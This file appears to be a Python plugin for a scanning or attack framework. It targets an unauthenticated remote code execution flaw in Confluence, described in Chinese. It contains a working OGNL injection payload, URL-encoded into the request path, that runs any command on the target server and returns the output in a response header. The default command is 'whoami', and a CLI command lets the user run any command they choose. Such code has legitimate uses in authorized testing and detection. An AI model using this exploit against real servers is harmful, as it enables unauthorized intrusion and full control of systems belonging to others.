# -*-* coding:UTF-8
import urllib.parse


class Plugin(Base):
    __info__ = {
        "name": "Confluence 远程代码执行漏洞",
        "description": "未经身份验证的攻击者远程利用该漏洞，通过发送恶意的Web请求注入命令，实现在目标服务器上的任意代码执行，从而控制目标服务器",
        "references": ["-"],
    }

    def url(self) -> dict:
        if self.exec_cmd(self.target.value, "whoami"):
            return {"LoopholeInfo": self.__info__}

    @cli.command(description='执行系统命令')
    @cli.options("url", help="攻击的目标", default="{self.target.value}")
    @cli.options("cmd", help="执行的命令", default="whoami")
    def exec_cmd(self, url, cmd):
        r = self.request(
            method='get',
            url=urllib.parse.urljoin(url, f"./%24%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%22{cmd}%22%29.getInputStream%28%29%2C%22utf-8%22%29%29.%28%40com.opensymphony.webwork.ServletActionContext%40getResponse%28%29.setHeader%28%22X-Cmd-Response%22%2C%23a%29%29%7D/"),
            follow_redirects=False,
            timeout=30
        )
        if r.status_code == 302 and 'x-cmd-response' in r.headers.keys():
            res = r.headers['x-cmd-response']
            return res
